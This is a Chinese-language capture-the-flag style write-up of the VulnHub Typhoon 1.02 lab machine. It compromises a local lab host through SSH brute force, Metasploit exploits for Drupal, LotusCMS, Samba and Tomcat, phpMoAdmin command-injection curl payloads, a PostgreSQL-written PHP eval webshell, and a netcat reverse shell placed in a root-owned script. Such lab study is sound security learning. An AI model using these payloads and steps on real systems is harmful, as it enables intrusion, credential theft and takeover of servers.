---
title: Typhoon-1.02
author: Creexile
date: 2025-01-23 16:06:52
lastMod: 2025-01-23
summary: 'easyNo.10'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [爆破, 漏洞利用, NFS挂载, PostgreSQL, 渗透]
---

# Typhoon: 1.02

---

easyNo.10

> 来源: [vulnhub靶场-Typhoon: 1.02](https://www.vulnhub.com/entry/typhoon-102,267/)
>
> 目标: 根据描述也许是getshell而不是getroot
>
> 描述: Typhoon VM contains several vulnerabilities and configuration errors.
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

- kali: 192.168.56.5
- target: 192.168.56.21

## 利用过程

我觉得这个不像那种特定的靶机, 更像是那种靶场集合; 而且引用的文件有些经过谷歌的, 这导致请求非常慢, 准备好一些妙妙工具

### 端口和服务发现

nmap进行ip发现和端口扫描

```
nmap -sS 192.168.56.0/24
nmap -A -p 0-25535 192.168.56.21

PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
631/tcp   open  ipp
993/tcp   open  imaps
995/tcp   open  pop3s
2049/tcp  open  nfs
3306/tcp  open  mysql
5432/tcp  open  postgresql
6379/tcp  open  redis
8080/tcp  open  http-proxy
27017/tcp open  mongod
```

### 21 ftp

存在匿名登录, 可是没有东西

```bash
ftp 192.168.56.21
anonymous
# 密码为空
```

### 22 ssh

不知道用户名和密码可以直接开爆; 不过一般的主机都有登录限制, 这个只能说不通用吧

```
search scanner/ssh
use auxiliary/scanner/ssh/ssh_enumusers
options
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250117185137.png)

得到用户admin, 尝试爆破密码, 真给我爆出来了; ssh登录即可

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.21
# admin : metallica
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250117185939.png)

> msf框架下其他指令也是正常执行的, 不用当出来再进去的怨种

### 25 smtp

通常用于信息收集, 比如这个就是用户名枚举

```bash
smtp-user-enum -M VRFY -U user.txt -t 192.168.56.21
```

### 80 http

从80端口下手, 进行目录扫描, 以下是一些可能有用的目录:

```
[05:42:31] 301 -  311B  - /cms
[05:42:33] 301 -  314B  - /drupal
[05:42:34] 302 -    0B  - /dvwa/
[05:42:41] 301 -  318B  - /phpmyadmin
[05:42:43] 200 -   37B  - /robots.txt
```

尝试用弱密码/默认密码登录`/cms`, `/phpmyadmin`和`/drupal`, 均以失败告终; 而`/dvwa`倒是有, 而且警告似乎也说了可能被利用

#### Drupal CMS

先试试Drupal CMS(`CVE-2018-7600`), 这个毕竟在msf中有对应利用模块

```bash
search drupal
use exploit/unix/webapp/drupal_drupalgeddon2
set rhost 192.168.56.21
set targeturi /drupal
set lhost 192.168.56.5
run
```

然后就拿到shell了, 权限为www-data

#### phpMoAdmin

从`/robots.txt`中可以拿到`/mongoadmin/`, 访问的时候似乎是个管理MongoDB库的小工具phpMoAdmin

存在就一定有存在的理由; 多翻了几下, 反正就是在某个类似表的creds下找到了用户名和密码`typhoon : 789456123`

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250117190409.png)

> 如果告诉你没数据或者没加载出来, 切换一下数据库(默认是个admin?)

或者可以点击那个stats查看版本信息, 可以得到phpMoAdmin版本为1.0.9, 可以找到一些立刻使用的RCE payload

```bash
curl http://192.168.56.21/mongoadmin/index.php -d "object=1;system('whoami');//"

curl 'http://192.168.56.21/mongoadmin/index.php?collection=admin&action=listRows&find=array();passthru("uname%20-a");exit;'
```

#### Lotus CMS

搜索lotuscms, 这个cms同样在msf中有利用脚本, 对应漏洞为`CVE-2011-0518`

```bash
search lotuscms
use exploit/multi/http/lcms_php_exec
set lhost 192.168.56.5
set rhost 192.168.56.21
set uri /cms/
# 记得换端口
```

### 445 smb

不愧是永恒之蓝, 直接拿到root权限; 虽然这个不是很稳定, 但是已经可以做很多事了

```
use exploit/linux/samba/is_known_pipename
set rhost 192.168.56.21
run
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250118163101.png)

### 2049 nfs

```bash
showmount -e 192.168.56.21
# /typhoon *
mount -t nfs 192.168.56.21:/typhoon /tmp/nfs
```

挂载后可以进入, 一共三个secret, 一个flag, 一个让你登录typhoon用户, 一个是rsa文件; 那没什么好说的

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250117193837.png)

### 5432 postgresql

先获取用户名和密码, 这个似乎就是遍历所有的默认账密

```bash
search postgres
use auxiliary/scanner/postgres/postgres_login
set rhosts 192.168.56.21
run
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250117231858.png)

`postgres:postgres@template1`, 利用对应程序登录

```bash
psql -h 192.168.56.21 -U postgres

# 列目录
select pg_ls_dir('./');
# 读取权限允许的文件
select pg_read_file('postgresql.conf',0,1000);
# 建表,并使用copy从文件写入数据到表用于读取/etc/passwd第一行
DROP TABLE if EXISTS MrLee;CREATE TABLE MrLee(t TEXT);COPY MrLee FROM '/etc/passwd';select * from MrLee limit 1 offset 0;
# 直接读出所有数据
SELECT * FROM MrLee;

# 创建OID，清空内容
SELECT lo_create(998);
delete from pg_largeobject where loid=998;
# 写入经过加密的一句话木马
# <?php @eval($_POST['123']);?>
insert into pg_largeobject (loid,pageno,data) values(998, 0, decode('3C3F70687020406576616C28245F504F53545B27313233275D293B3F3E', 'hex'));
```

数据将被插入到`pg_largeobject`表中。它指定将插入数据的列：`loid`、`pageno`和`data`。

- `998`是该列的值`loid`。
- `0`是该列的值`pageno`。
- `decode('3C3F70687020406576616C28245F504F53545B27313233275D293B3F3E', 'hex')`是该列的值`data`。这部分将十六进制字符串解码

将id998的内容写到`/var/www/html/shell.php`内, 使用蚁剑连接即可

```sql
select lo_export(998,'/var/www/html/shell.php');
```

> lo_export函数是一个 PostgreSQL 函数，它将大对象的数据导出到服务器文件系统上的文件中。在本例中，它从loid值为 的大对象中导出数据998lo_export函数是一个 PostgreSQL 函数，它将大对象的数据导出到服务器文件系统上的文件中。在本例中，它从loid值为 的大对象中导出数据998

### 6379 redis

```bash
redis-cli -h 192.168.56.21
```

1. 利用redis写webshell
2. 利用”公私钥”认证获取root权限
3. 利用crontab反弹shell

反正这里利用不了, 到时候其他地方能用的时候再写吧

[Redis未授权访问漏洞复现与利用](https://www.cnblogs.com/bmjoker/p/9548962.html)

### 8080 tomcat

访问8080, 发现是tomcat7且有`manager webapp`的登录; 可以使用Tomcat Manager Upload获取shell

> 默认用户名和默认密码均为tomcat

```bash
search tomcat manager
use exploit/multi/http/tomcat_mgr_upload
# 还有一个tomcat_mgr_deploy, 我没试过
set httppassword tomcat
set httpusername tomcat
set lhost 192.168.56.5
set rhost 192.168.56.21
set rport 8080
# 记得换端口
```

> 我出现了上传成功但是告诉我找不到payload的问题, 这时候只需要退出msf然后进行更新`apt-get install metasploit-framework`, 然后我就解决了

[利用Tomcat Manager的多种方法](https://wh0ale.github.io/2018/12/23/2018-12-23-%E5%88%A9%E7%94%A8Tomcat%20Manager%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/)

## 提权

如果是admin用户:

```bash
# 发现任意位置都可以sudo执行
sudo -l
sudo bash
```

如果不是admin用户:

```bash
# 系统信息 Linux typhoon.local 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
uname -a
# 内核版本 3.13.0-32-generic
uname -r
# 查看发行版 Ubuntu 14.04
lsb_release -a
# 查看环境
python -h
nc -h
gcc -v
# 查看权限, 无
sudo -l
# 查看特权文件, 无发现
find / -perm -u=s -type f 2>/dev/null
# 看看计划任务, 无发现
cat /etc/crontab
```

看来还是得用内核漏洞; Ubuntu 14.04, 也是非常经典存在内核漏洞的版本

```
searchsploit  3.13.0
searchsploit -m 37292.c
```

> 45010.c 似乎也可以

或者, 还有一种方法

在`/tab`下有一个`script.sh`文件, 该文件是root权限

```bash
# 我实在没写出来怎么排除permission denied的命令
# 这里找到一个/tab／script.sh且没有permission denied
find / -type f -name "*.sh" -user root
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250118153233.png)

此时我们可以写一个反弹shell进这个bash文件用于直接获得root权限, 可以用msf来生成反弹shell

```bash
# 奇怪, 有时候直接复制会报错
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.56.5 lport=1234 R
# mkfifo /tmp/trzkdwp; nc 192.168.56.21 1234 0</tmp/trzkdwp | /bin/sh >/tmp/trzkdwp 2>&1; rm /tmp/trzkdwp
```

写入/监听/运行

```bash
echo "mkfifo /tmp/trzkdwp; nc 192.168.56.5 1234 0</tmp/trzkdwp | /bin/sh >/tmp/trzkdwp 2>&1; rm /tmp/trzkdwp" > script.sh

# kali
nc -lvnp 1234
# target
./script.sh
```

有时候权限还是原来的权限, 退出重新试试就好了

反正最后都是在root目录下找到root-flag

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250118160200.png)

# 附录

已复现

- drupal漏洞利用
- SSH端口爆破
- phpMoAdmin利用
- LotusCMS漏洞利用
- Tomcat漏洞利用
- 5432 PostgreSQL漏洞利用
- Linux版永恒之蓝 445端口（139端口）

未复现

- Shellshock漏洞利用

  [Shellshock漏洞复现](https://blog.csdn.net/weixin_44283446/article/details/123630335); 这个属于是命令执行了, 反弹shell那些就不再说了

- Samba远程代码执行漏洞（CVE-2017-7494)

  [利用Samba远程代码执行漏洞(CVE-2017-7494)获取shell](https://blog.csdn.net/qq_18780551/article/details/137267217)

- 25端口DNS漏洞利用-区域攻击
  [# DNS 区域传送漏洞（dns-zone-tranfer）学习](https://blog.csdn.net/Goodric/article/details/128290352); 这个一般用于信息收集的, 就不搞了

> 据说还有DNS拒绝服务攻击
